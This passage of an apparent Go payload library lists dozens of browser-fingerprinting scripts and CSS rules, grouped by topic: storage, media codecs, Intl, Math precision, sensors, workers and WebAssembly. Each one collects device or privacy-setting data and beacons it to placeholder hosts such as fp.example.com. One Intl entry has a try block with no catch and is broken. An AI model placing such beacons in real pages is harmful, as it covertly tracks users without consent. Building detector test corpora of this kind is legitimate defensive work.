	{Raw: `<script>var ls=typeof localStorage!=='undefined';var ss=typeof sessionStorage!=='undefined';var idx=typeof indexedDB!=='undefined';new Image().src='//fp.example.com/store?ls='+(ls?'1':'0')+'&ss='+(ss?'1':'0')+'&idx='+(idx?'1':'0');</script>`, Description: "存储-API支持检测", FPType: FingerprintPlugin},
	{Raw: `<script>try{localStorage.setItem('__fp_test__','1');localStorage.removeItem('__fp_test__');new Image().src='//fp.example.com/store2?ok=1';}catch(e){new Image().src='//fp.example.com/store2?ok=0';}</script>`, Description: "存储-localStorage可用性", FPType: FingerprintPlugin},
}

var fingerprintMedia = []Payload{
	{Raw: `<script>var caps=['video/mp4; codecs="avc1.42E01E"','video/webm; codecs="vp8"','video/ogg; codecs="theora"','video/mp2t','audio/mpeg','audio/mp4; codecs="mp4a.40.2"','audio/webm; codecs="vorbis"','audio/ogg; codecs="vorbis"'];var v=document.createElement('video');var a=new Audio();var results=[];caps.forEach(function(c){results.push(c+':'+v.canPlayType(c));});</script>`, Description: "媒体-编解码器检测", FPType: FingerprintPlugin},
	{Raw: `<script>var codecs={};var v=document.createElement('video');['probably','maybe',''].forEach(function(r){['avc1.42E01E','avc1.4D401E','hvc1.1.6.L120.90','hev1.1.6.L120.90','vp9','vp8'].forEach(function(c){var key='video/mp4; codecs="'+c+'",'+r;if(!codecs[c])codecs[c]=v.canPlayType(key);});});</script>`, Description: "媒体-详细编码检测", FPType: FingerprintPlugin},
}

var fingerprintComprehensive = []Payload{
	{Raw: `<script>(function(){var f={};f.navProps=[];for(var p in navigator){try{if(typeof navigator[p]!=='function')f.navProps.push(p+'='+navigator[p]);}catch(e){}}f.docProps=[];for(var p in document){try{if(typeof document[p]!=='function')f.docProps.push(p);}catch(e){}}f.winProps=Object.keys(window).length;f.docMode=document.documentMode||'';f.compatMode=document.compatMode||'';f.cookieEnabled=navigator.cookieEnabled;f.onLine=navigator.onLine;f.referrer=document.referrer||'';var s=JSON.stringify(f),h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}new Image().src='//fp.example.com/nav?h='+h+'&d='+encodeURIComponent(s);})();</script>`, Description: "综合-Navigator/Document属性枚举", FPType: FingerprintCanvas},
	{Raw: `<script>(function(){var f={};var el=document.createElement('div');el.style.cssText='position:absolute;visibility:hidden;width:100px;height:100px';document.body.appendChild(el);f.flexbox=('flexWrap' in el.style)||('WebkitFlexWrap' in el.style);f.csGrid=('gridTemplateColumns' in el.style);f.webgl2=!!document.createElement('canvas').getContext('webgl2');f.webGPU=!!navigator.gpu;f.speech=!!(window.SpeechSynthesisUtterance||window.webkitSpeechRecognition);f.vibrate=!!navigator.vibrate;f.credential=!!navigator.credentials;f.clipboard=!!navigator.clipboard;f.share=!!navigator.share;f.locks=!!navigator.locks;f.permissions=!!navigator.permissions;f.servWorker=!!navigator.serviceWorker;f.payment=!!navigator.paymentRequest;document.body.removeChild(el);var s=JSON.stringify(f),h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}new Image().src='//fp.example.com/feat?h='+h+'&d='+encodeURIComponent(s);})();</script>`, Description: "综合-CSS/WebAPI特性检测", FPType: FingerprintCanvas},
	{Raw: `<script>(function(){var f={};f.mathCos=Math.cos(1e10).toString().substring(0,20);f.mathSin=Math.sin(-1e10).toString().substring(0,20);f.mathTan=Math.tan(0.1).toFixed(15);f.dateParse=new Date('2015-06-15T12:00:00Z').getTime();f.dateNeg=new Date(-62135596800000).toISOString();f.regex=new RegExp('a{1,2}','gi').exec('aa').toString();f.arraySort=[1,10,2,20].sort().join(',');f.jsonStr=JSON.stringify({a:1,b:null}).length;f.errorStack=Error().stack?Error().stack.substring(0,100):'';var s=JSON.stringify(f),h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}new Image().src='//fp.example.com/math?h='+h+'&d='+encodeURIComponent(s);})();</script>`, Description: "综合-JS引擎精度检测", FPType: FingerprintCanvas},
	{Raw: `<script>(function(){var d={};try{var c=document.createElement('canvas');var ctx=c.getContext('2d');ctx.fillText('Test',2,15);d.canvas=c.toDataURL().length;}catch(e){}try{var gl=document.createElement('canvas').getContext('webgl')||document.createElement('canvas').getContext('experimental-webgl');if(gl){var e=gl.getExtension('WEBGL_debug_renderer_info');d.gpu=gl.getParameter(e.UNMASKED_RENDERER_WEBGL);}}catch(e){}d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;d.lang=navigator.language;d.platform=navigator.platform;d.cores=navigator.hardwareConcurrency||0;d.mem=navigator.deviceMemory||0;d.screen=screen.width+'x'+screen.height;d.dpr=window.devicePixelRatio||1;var h=JSON.stringify(d);var hash=0;for(var i=0;i<h.length;i++){hash=((hash<<5)-hash)+h.charCodeAt(i);hash|=0;}new Image().src='//fp.example.com/c?d='+encodeURIComponent(h)+'&hash='+hash;})();</script>`, Description: "综合-多维采集", FPType: FingerprintCanvas},
	{Raw: `<script>(function(){var fp={};fp.ua=navigator.userAgent;fp.platform=navigator.platform;fp.screen=screen.width+'x'+screen.height+'x'+screen.colorDepth;fp.tz=new Date().getTimezoneOffset();fp.lang=navigator.language;fp.cores=navigator.hardwareConcurrency||0;fp.plugins=navigator.plugins.length;fp.touch=navigator.maxTouchPoints||0;fp.cookie=navigator.cookieEnabled;fp.dnt=navigator.doNotTrack||'unspecified';try{var c=document.createElement('canvas');c.getContext('2d').fillText('FP',0,20);fp.canvas=c.toDataURL().substring(0,80);}catch(e){}var hash=0,s=JSON.stringify(fp);for(var i=0;i<s.length;i++){hash=((hash<<5)-hash)+s.charCodeAt(i);hash|=0;}new Image().src='//t.example.com/fp?h='+hash+'&d='+encodeURIComponent(JSON.stringify(fp));})();</script>`, Description: "综合-XHR指纹收集", FPType: FingerprintCanvas},
	{Raw: "<script>(function(){try{var e=[],o='';for(var i in window){try{if(typeof window[i]==='function')e.push(i);}catch(err){}}o=e.sort().join(',');var hash=0;for(var i=0;i<o.length;i++){hash=((hash<<5)-hash)+o.charCodeAt(i);hash|=0;}new Image().src='//fp.example.com/glob?h='+hash;})();</script>", Description: "综合-全局函数检测", FPType: FingerprintCanvas},
	{Raw: `<script>(function(){var w=window,d=document,n=navigator;var f={};f.res=d.documentElement.clientWidth+'x'+d.documentElement.clientHeight;f.os=n.oscpu||n.cpuClass||'';f.build=n.buildID||'';f.doNotTrack=n.doNotTrack||n.msDoNotTrack||'';f.vendorSub=n.vendorSub||'';f.productSub=n.productSub||'';f.appCode=n.appCodeName;f.appMinor=n.appMinorVersion;var s=JSON.stringify(f);var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}new Image().src='//fp.example.com/rare?h='+h;})();</script>`, Description: "综合-罕见属性收集", FPType: FingerprintCanvas},
	{Raw: `<script>(function(){var f={};try{var c=document.createElement('canvas');var g=c.getContext('webgl')||c.getContext('experimental-webgl');if(g){var e=g.getExtension('WEBGL_debug_renderer_info');f.gpu=g.getParameter(e.UNMASKED_RENDERER_WEBGL);f.glver=g.getParameter(g.VERSION);f.glsl=g.getParameter(g.SHADING_LANGUAGE_VERSION);f.glven=g.getParameter(g.VENDOR);f.ext=g.getSupportedExtensions().join(',');}}catch(e){}f.audio=typeof AudioContext!=='undefined'||typeof webkitAudioContext!=='undefined';f.webRTC=typeof RTCPeerConnection!=='undefined';f.bluetooth=navigator.bluetooth?'1':'0';f.usb=navigator.usb?'1':'0';f.dpr=window.devicePixelRatio;var s=JSON.stringify(f),h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}new Image().src='//fp.example.com/hw/'+h+'?d='+encodeURIComponent(s);})();</script>`, Description: "综合-硬件指纹深度收集", FPType: FingerprintCanvas},
	{Raw: `<script>(function(){var d={};d.pixelDepth=screen.pixelDepth;d.colorDepth=screen.colorDepth;d.availWidth=screen.availWidth;d.availHeight=screen.availHeight;d.availLeft=screen.availLeft;d.availTop=screen.availTop;d.orientation=screen.orientation?screen.orientation.type:'unknown';d.angle=screen.orientation?screen.orientation.angle:'unknown';d.deviceXDPI=screen.deviceXDPI||'unknown';d.deviceYDPI=screen.deviceYDPI||'unknown';d.logicalXDPI=screen.logicalXDPI||'unknown';d.logicalYDPI=screen.logicalYDPI||'unknown';new Image().src='//fp.example.com/scr?d='+encodeURIComponent(JSON.stringify(d));})();</script>`, Description: "综合-屏幕全部属性", FPType: FingerprintScreen},
}

var fingerprintTouch = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/touch?max='+(navigator.maxTouchPoints||0)+'&ms='+(navigator.msMaxTouchPoints||0)+'&touch='+('ontouchstart' in window?'1':'0');</script>`, Description: "触控-最大触点数量", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/touch2?start='+('ontouchstart' in window?'1':'0')+'&move='+('ontouchmove' in window?'1':'0')+'&end='+('ontouchend' in window?'1':'0')+'&cancel='+('ontouchcancel' in window?'1':'0');</script>`, Description: "触控-事件支持检测", FPType: FingerprintScreen},
}

var fingerprintOrientation = []Payload{
	{Raw: `<script>if(window.DeviceOrientationEvent){window.addEventListener('deviceorientation',function(e){new Image().src='//fp.example.com/orient?alpha='+e.alpha+'&beta='+e.beta+'&gamma='+e.gamma;},{once:true});}</script>`, Description: "方向-陀螺仪数据", FPType: FingerprintHardware},
	{Raw: `<script>if(window.DeviceMotionEvent){window.addEventListener('devicemotion',function(e){var a=e.acceleration;new Image().src='//fp.example.com/motion?x='+(a?a.x:'?')+'&y='+(a?a.y:'?')+'&z='+(a?a.z:'?');},{once:true});}</script>`, Description: "方向-加速度数据", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/orient2?de='+('DeviceOrientationEvent' in window?'1':'0')+'&dm='+('DeviceMotionEvent' in window?'1':'0')+'&com='+('oncompassneedscalibration' in window?'1':'0');</script>`, Description: "方向-API支持检测", FPType: FingerprintHardware},
}

var fingerprintCSSMedia = []Payload{
	{Raw: `<script>var mql=window.matchMedia('(prefers-color-scheme: dark)');new Image().src='//fp.example.com/media?dark='+(mql.matches?'1':'0');</script>`, Description: "CSS-暗色模式偏好", FPType: FingerprintScreen},
	{Raw: `<script>var mql=window.matchMedia('(prefers-reduced-motion: reduce)');new Image().src='//fp.example.com/media2?motion='+(mql.matches?'1':'0');</script>`, Description: "CSS-减少动画偏好", FPType: FingerprintScreen},
	{Raw: `<script>var mql=window.matchMedia('(prefers-contrast: high)');new Image().src='//fp.example.com/media3?contrast='+(mql.matches?'1':'0');</script>`, Description: "CSS-高对比度偏好", FPType: FingerprintScreen},
	{Raw: `<script>var mql=window.matchMedia('(forced-colors: active)');new Image().src='//fp.example.com/media4?forced='+(mql.matches?'1':'0');</script>`, Description: "CSS-强制颜色模式", FPType: FingerprintScreen},
	{Raw: `<script>var mql=window.matchMedia('(prefers-color-scheme: light)');new Image().src='//fp.example.com/media5?light='+(mql.matches?'1':'0');</script>`, Description: "CSS-亮色模式偏好", FPType: FingerprintScreen},
}

var fingerprintNavigatorProps = []Payload{
	{Raw: `<script>var p=navigator;var d={};d.userAgent=p.userAgent;d.appVersion=p.appVersion;d.appName=p.appName;d.appCodeName=p.appCodeName;d.product=p.product;d.productSub=p.productSub;d.vendor=p.vendor;d.vendorSub=p.vendorSub;d.platform=p.platform;d.language=p.language;d.languages=p.languages?p.languages.join(','):'';d.onLine=p.onLine;d.cookieEnabled=p.cookieEnabled;d.doNotTrack=p.doNotTrack||p.msDoNotTrack||'';d.hardwareConcurrency=p.hardwareConcurrency||'';d.deviceMemory=p.deviceMemory||'';d.maxTouchPoints=p.maxTouchPoints||'';d.webdriver=p.webdriver||'';d.pdfViewerEnabled=p.pdfViewerEnabled||'';new Image().src='//fp.example.com/navall?d='+encodeURIComponent(JSON.stringify(d));</script>`, Description: "Nav-全部属性", FPType: FingerprintUserAgent},
	{Raw: `<script>var p=navigator;var d='';d+='ua_len:'+p.userAgent.length+',';d+='app:'+p.appName+',';d+='ver:'+p.appVersion.substring(0,10)+',';d+='plat:'+p.platform+',';d+='prod:'+p.product+',';d+='vend:'+(p.vendor||'');new Image().src='//fp.example.com/nav2?'+d;</script>`, Description: "Nav-精简属性", FPType: FingerprintUserAgent},
	{Raw: `<script>new Image().src='//fp.example.com/nav3?wc='+(navigator.webdriver?'1':'0')+'&auto='+(navigator.automationControlled?'1':'0')+'&headless='+(!navigator.webdriver&&navigator.userAgent.indexOf('Headless')>=0?'1':'0');</script>`, Description: "Nav-headless检测", FPType: FingerprintUserAgent},
}

var fingerprintCSSFingerprinting = []Payload{
	{Raw: `<style>@media (min-resolution: 2dppx){body::after{content:url('//fp.example.com/css?retina=1')}}@media (max-resolution: 1.9dppx){body::after{content:url('//fp.example.com/css?retina=0')}}</style>`, Description: "CSS-Retina媒体查询", FPType: FingerprintScreen},
	{Raw: `<style>@media (min-width: 1024px){body::after{content:url('//fp.example.com/css?desktop=1')}}@media (max-width: 1023px){body::after{content:url('//fp.example.com/css?mobile=1')}}</style>`, Description: "CSS-屏幕宽度检测", FPType: FingerprintScreen},
	{Raw: `<style>@media (hover: hover){body::after{content:url('//fp.example.com/css?hover=1')}}@media (hover: none){body::after{content:url('//fp.example.com/css?hover=0')}}</style>`, Description: "CSS-hover能力检测", FPType: FingerprintScreen},
	{Raw: `<style>@media (pointer: coarse){body::after{content:url('//fp.example.com/css?touch=1')}}@media (pointer: fine){body::after{content:url('//fp.example.com/css?touch=0')}}</style>`, Description: "CSS-指针类型检测", FPType: FingerprintScreen},
	{Raw: `<div style="font-family:'__fps_test_font__'">a</div><script>var el=document.querySelector('div');var s=getComputedStyle(el).fontFamily;new Image().src='//fp.example.com/cssf?f='+encodeURIComponent(s);</script>`, Description: "CSS-计算后字体族", FPType: FingerprintFont},
	{Raw: `<link rel="stylesheet" media="(prefers-color-scheme: dark)" href="//fp.example.com/css/dark.css"><link rel="stylesheet" media="(prefers-color-scheme: light)" href="//fp.example.com/css/light.css">`, Description: "CSS-按主题加载CSS", FPType: FingerprintScreen},
	{Raw: `<style>@supports(display:grid){body{background:url('//fp.example.com/css?grid=1')}}@supports not (display:grid){body{background:url('//fp.example.com/css?grid=0')}}</style>`, Description: "CSS-@supports grid", FPType: FingerprintScreen},
	{Raw: `<style>@supports(aspect-ratio:1){body::before{content:url('//fp.example.com/css?ar=1')}}</style>`, Description: "CSS-@supports aspect-ratio", FPType: FingerprintScreen},
}

var fingerprintVideoCard = []Payload{
	{Raw: `<script>var v=document.createElement('video');var info={};['video/mp4','video/webm','video/ogg','video/x-matroska'].forEach(function(t){info[t]=v.canPlayType(t);});new Image().src='//fp.example.com/vid?d='+encodeURIComponent(JSON.stringify(info));</script>`, Description: "视频-容器格式支持", FPType: FingerprintMedia},
	{Raw: `<script>var v=document.createElement('video');var codecs=['avc1.42E01E','avc1.42E01E,mp4a.40.2','avc1.4D401E','avc1.64001E','vp8','vp8.0','vp9','vp9.0','hev1.1.6.L120.90','hvc1.1.6.L120.90','theora','vorbis','opus'];var r={};codecs.forEach(function(c){['video/mp4','video/webm','video/ogg'].forEach(function(m){var key=m+'; codecs='+c;var val=v.canPlayType(key);if(val)r[key]=val;});});new Image().src='//fp.example.com/vidcodec?d='+encodeURIComponent(JSON.stringify(r));</script>`, Description: "视频-详细编码检测", FPType: FingerprintMedia},
	{Raw: `<script>var h264=document.createElement('video').canPlayType('video/mp4; codecs="avc1.42E01E"');var h265=document.createElement('video').canPlayType('video/mp4; codecs="hev1.1.6.L120.90"');new Image().src='//fp.example.com/vid2?h264='+h264+'&h265='+h265;</script>`, Description: "视频-H264/H265检测", FPType: FingerprintMedia},
}

var fingerprintDNT = []Payload{
	{Raw: `<script>var dnt=navigator.doNotTrack||navigator.msDoNotTrack||window.doNotTrack||'unspecified';new Image().src='//fp.example.com/dnt?v='+dnt;</script>`, Description: "DNT-DoNotTrack", FPType: FingerprintUserAgent},
	{Raw: `<script>var gpc=navigator.globalPrivacyControl;new Image().src='//fp.example.com/dnt2?gpc='+(gpc?'1':'0')+'&dnt='+(navigator.doNotTrack||'');</script>`, Description: "DNT-全局隐私控制", FPType: FingerprintUserAgent},
}

var fingerprintMath = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/math?pi='+Math.PI;</script>`, Description: "Math-PI", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/math2?e='+Math.E+'&ln='+Math.LN2+'&sq='+Math.SQRT2;</script>`, Description: "Math-常量", FPType: FingerprintHardware},
	{Raw: `<script>var d=new Date();new Image().src='//fp.example.com/math3?tz='+d.getTimezoneOffset()+'&yr='+d.getFullYear()+'&dl='+d.toLocaleString().length;</script>`, Description: "Math-Date属性", FPType: FingerprintTimezone},
	{Raw: `<script>var v=Math.cos(1e10).toString();new Image().src='//fp.example.com/math4?cos='+encodeURIComponent(v.substring(0,30));</script>`, Description: "Math-cos精度", FPType: FingerprintHardware},
	{Raw: `<script>var v=Math.sin(-1e10).toString();new Image().src='//fp.example.com/math5?sin='+encodeURIComponent(v.substring(0,30));</script>`, Description: "Math-sin精度", FPType: FingerprintHardware},
	{Raw: `<script>var v=Math.tan(0.1).toFixed(15);new Image().src='//fp.example.com/math6?tan='+v;</script>`, Description: "Math-tan精度", FPType: FingerprintHardware},
	{Raw: `<script>var v=Math.atan2(1,0).toString();new Image().src='//fp.example.com/math7?atan='+encodeURIComponent(v.substring(0,30));</script>`, Description: "Math-atan2精度", FPType: FingerprintHardware},
	{Raw: `<script>var v=Math.exp(1).toString();new Image().src='//fp.example.com/math8?exp='+encodeURIComponent(v.substring(0,30));</script>`, Description: "Math-exp精度", FPType: FingerprintHardware},
	{Raw: `<script>var v=Math.log(2).toString();new Image().src='//fp.example.com/math9?log='+encodeURIComponent(v.substring(0,30));</script>`, Description: "Math-log精度", FPType: FingerprintHardware},
	{Raw: `<script>var v=Math.pow(2,0.5).toString();new Image().src='//fp.example.com/math10?pow='+encodeURIComponent(v.substring(0,30));</script>`, Description: "Math-pow精度", FPType: FingerprintHardware},
	{Raw: `<script>var r=Math.random().toString();new Image().src='//fp.example.com/math11?rand='+encodeURIComponent(r.substring(0,30));</script>`, Description: "Math-random", FPType: FingerprintHardware},
	{Raw: `<script>var v=[1,10,2,20].sort().join(',');new Image().src='//fp.example.com/math12?sort='+v;</script>`, Description: "Math-排序算法", FPType: FingerprintHardware},
	{Raw: `<script>var v=0.1+0.2;new Image().src='//fp.example.com/math13?fp='+v.toString();</script>`, Description: "Math-浮点精度", FPType: FingerprintHardware},
	{Raw: `<script>var v=Number.EPSILON.toString();new Image().src='//fp.example.com/math14?eps='+v;</script>`, Description: "Math-Number.EPSILON", FPType: FingerprintHardware},
	{Raw: `<script>var v=Number.MAX_SAFE_INTEGER.toString();new Image().src='//fp.example.com/math15?maxInt='+v;</script>`, Description: "Math-MAX_SAFE_INTEGER", FPType: FingerprintHardware},
	{Raw: `<script>var v=Number.MIN_SAFE_INTEGER.toString();new Image().src='//fp.example.com/math16?minInt='+v;</script>`, Description: "Math-MIN_SAFE_INTEGER", FPType: FingerprintHardware},
	{Raw: `<script>var v=Number.MAX_VALUE.toString();new Image().src='//fp.example.com/math17?maxVal='+v;</script>`, Description: "Math-MAX_VALUE", FPType: FingerprintHardware},
	{Raw: `<script>var v=Number.MIN_VALUE.toString();new Image().src='//fp.example.com/math18?minVal='+v;</script>`, Description: "Math-MIN_VALUE", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/math19?isNan='+(isNaN(NaN)?'1':'0')+'&isFin='+(isFinite(1/0)?'1':'0');</script>`, Description: "Math-isNaN/isFinite", FPType: FingerprintHardware},
	{Raw: `<script>var a=new Float32Array(1);a[0]=0.1+0.2;new Image().src='//fp.example.com/math20?f32='+a[0];</script>`, Description: "Math-Float32精度", FPType: FingerprintHardware},
}

var fingerprintIntl = []Payload{
	{Raw: `<script>var o=Intl.DateTimeFormat().resolvedOptions();new Image().src='//fp.example.com/intl?tz='+o.timeZone+'&cal='+o.calendar+'&num='+o.numberingSystem+'&locale='+o.locale;</script>`, Description: "Intl-完整选项", FPType: FingerprintTimezone},
	{Raw: `<script>new Image().src='//fp.example.com/intl2?coll='+(Intl.Collator?'1':'0')+'&dt='+(Intl.DateTimeFormat?'1':'0')+'&num='+(Intl.NumberFormat?'1':'0');</script>`, Description: "Intl-API检测", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=Intl.NumberFormat().format(1234567.89);new Image().src='//fp.example.com/intl3?num='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-数字格式化", FPType: FingerprintLanguage},
	{Raw: `<script>var date=new Date(2000,0,1);var fmt=Intl.DateTimeFormat('en-US',{weekday:'long',year:'numeric',month:'long',day:'numeric'});new Image().src='//fp.example.com/intl4?d='+encodeURIComponent(fmt.format(date));</script>`, Description: "Intl-日期格式化", FPType: FingerprintLanguage},
	{Raw: `<script>var locales=['en-US','zh-CN','ja-JP','ko-KR','ar-SA','ru-RU','de-DE','fr-FR','es-ES','pt-BR'];var r={};locales.forEach(function(l){try{r[l]=Intl.NumberFormat(l).format(1234.56);}catch(e){}});</script>`, Description: "Intl-多区域测试", FPType: FingerprintLanguage},
	{Raw: `<script>new Image().src='//fp.example.com/intl5?plural='+(Intl.PluralRules?'1':'0')+'&relative='+(Intl.RelativeTimeFormat?'1':'0')+'&list='+(Intl.ListFormat?'1':'0');</script>`, Description: "Intl-扩展API检测", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.NumberFormat('en-US',{style:'currency',currency:'USD'}).format(1000);new Image().src='//fp.example.com/intl6?cur='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-货币格式化", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.NumberFormat('en-US',{style:'percent'}).format(0.5);new Image().src='//fp.example.com/intl7?pct='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-百分比格式化", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.NumberFormat('en-US',{useGrouping:true}).format(1234567);new Image().src='//fp.example.com/intl8?grp='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-千分位格式化", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.DateTimeFormat('en-US',{hour:'numeric',minute:'numeric',second:'numeric',hour12:false}).format(new Date());new Image().src='//fp.example.com/intl9?time='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-时间格式化", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.RelativeTimeFormat('en-US',{numeric:'auto'}).format(-1,'day');new Image().src='//fp.example.com/intl10?rel='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-相对时间", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.ListFormat('en-US',{style:'long',type:'conjunction'}).format(['a','b','c']);new Image().src='//fp.example.com/intl11?list='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-列表格式化", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.PluralRules('en-US').select(1);new Image().src='//fp.example.com/intl12?pl='+n;}catch(e){}</script>`, Description: "Intl-单复数规则", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.Collator('en-US',{sensitivity:'base'}).compare('a','A');new Image().src='//fp.example.com/intl13?col='+n;}catch(e){}</script>`, Description: "Intl-排序器", FPType: FingerprintLanguage},
	{Raw: `<script>try{var s=new Intl.DisplayNames('en-US',{type:'region'}).of('US');new Image().src='//fp.example.com/intl14?dn='+encodeURIComponent(s);}catch(e){}</script>`, Description: "Intl-DisplayNames", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.DateTimeFormat('en-US',{dateStyle:'full'}).format(new Date());new Image().src='//fp.example.com/intl15?ds='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-dateStyle", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.DateTimeFormat('en-US',{timeStyle:'short'}).format(new Date());new Image().src='//fp.example.com/intl16?ts='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-timeStyle", FPType: FingerprintLanguage},
	{Raw: `<script>try{var o=Intl.DateTimeFormat().resolvedOptions();new Image().src='//fp.example.com/intl17?tz='+o.timeZone+'&hour='+o.hourCycle+'&cal='+o.calendar+'&locale='+o.locale;</script>`, Description: "Intl-hourCycle", FPType: FingerprintTimezone},
	{Raw: `<script>try{var n=new Intl.NumberFormat('en-US',{minimumFractionDigits:3,maximumFractionDigits:3}).format(1.5);new Image().src='//fp.example.com/intl18?frac='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-小数位控制", FPType: FingerprintLanguage},
	{Raw: `<script>try{var n=new Intl.NumberFormat('en-US',{notation:'scientific'}).format(1234567);new Image().src='//fp.example.com/intl19?sci='+encodeURIComponent(n);}catch(e){}</script>`, Description: "Intl-科学记数法", FPType: FingerprintLanguage},
}

var fingerprintWebWorker = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/worker?w='+(typeof Worker!=='undefined'?'1':'0')+'&sw='+(typeof SharedWorker!=='undefined'?'1':'0')+'&se='+(typeof ServiceWorker!=='undefined'?'1':'0');</script>`, Description: "Worker-API检测", FPType: FingerprintHardware},
	{Raw: `<script>try{var w=new Worker('data:text/javascript,postMessage(1)');new Image().src='//fp.example.com/worker2?ok=1';}catch(e){new Image().src='//fp.example.com/worker2?ok=0';}</script>`, Description: "Worker-dataURL创建", FPType: FingerprintHardware},
	{Raw: `<script>try{var w=new Worker(URL.createObjectURL(new Blob(['self.postMessage(1)'],{type:'text/javascript'})));new Image().src='//fp.example.com/worker3?blob=1';}catch(e){new Image().src='//fp.example.com/worker3?blob=0';}</script>`, Description: "Worker-Blob URL创建", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/worker4?hard='+(navigator.hardwareConcurrency||0)+'&threads='+(typeof Worker!=='undefined'?1:0);</script>`, Description: "Worker-硬件并发检测", FPType: FingerprintHardware},
	{Raw: `<script>try{var code='function f(n){if(n<=1)return n;return f(n-1)+f(n-2);}';var start=Date.now();try{new Function(code+'postMessage(f(20));')();}catch(e){var end=Date.now();new Image().src='//fp.example.com/worker5?perf='+(end-start);}}catch(e){}</script>`, Description: "Worker-JS引擎性能", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/worker6?sw='+('serviceWorker' in navigator?'1':'0')+'&reg='+(navigator.serviceWorker&&navigator.serviceWorker.register?'1':'0');</script>`, Description: "Worker-ServiceWorker检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/worker7?swc='+(navigator.serviceWorker&&navigator.serviceWorker.controller?'1':'0')+'&swr='+(navigator.serviceWorker&&navigator.serviceWorker.ready?'1':'0');</script>`, Description: "Worker-SW控制器状态", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/worker8?swr='+(navigator.serviceWorker&&navigator.serviceWorker.getRegistration?'1':'0');</script>`, Description: "Worker-SW注册检查", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/worker9?sw='+(navigator.serviceWorker&&navigator.serviceWorker.getRegistrations?'1':'0');</script>`, Description: "Worker-SW获取所有注册", FPType: FingerprintPlugin},
	{Raw: `<script>try{var sw=navigator.serviceWorker;sw.getRegistration().then(function(r){new Image().src='//fp.example.com/worker10?scope='+encodeURIComponent(r?r.scope:'');});}catch(e){}</script>`, Description: "Worker-SW作用域", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/worker11?shared='+(typeof SharedWorker!=='undefined'?'1':'0');</script>`, Description: "Worker-SharedWorker支持", FPType: FingerprintHardware},
	{Raw: `<script>try{new SharedWorker('data:text/javascript,onconnect=function(e){e.ports[0].postMessage(1)}');new Image().src='//fp.example.com/worker12?sw_ok=1';}catch(e){new Image().src='//fp.example.com/worker12?sw_ok=0';}</script>`, Description: "Worker-SharedWorker创建", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/worker13?bmw='+(typeof DedicatedWorkerGlobalScope!=='undefined'?'1':'0');</script>`, Description: "Worker-全局作用域检测", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/worker14?offline='+('onLine' in navigator?navigator.onLine?'1':'0':'na');</script>`, Description: "Worker-离线检测", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/worker15?sync='+('SyncManager' in window?'1':'0')+'&periodic='+('PeriodicSyncManager' in window?'1':'0');</script>`, Description: "Worker-后台同步检测", FPType: FingerprintPlugin},
}

var fingerprintWebAssembly = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/wasm?wa='+(typeof WebAssembly!=='undefined'?'1':'0')+'&wasm='+(WebAssembly&&WebAssembly.instantiate?'1':'0');</script>`, Description: "WASM-API检测", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm2?comp='+(WebAssembly&&WebAssembly.compile?'1':'0')+'&vali='+(WebAssembly&&WebAssembly.validate?'1':'0');</script>`, Description: "WASM-compile/validate", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm3?compS='+(WebAssembly&&WebAssembly.compileStreaming?'1':'0')+'&instS='+(WebAssembly&&WebAssembly.instantiateStreaming?'1':'0');</script>`, Description: "WASM-流式编译", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/wasm4?mem='+(typeof WebAssembly.Memory!=='undefined'?'1':'0')+'&table='+(typeof WebAssembly.Table!=='undefined'?'1':'0');</script>`, Description: "WASM-Memory/Table", FPType: FingerprintHardware},
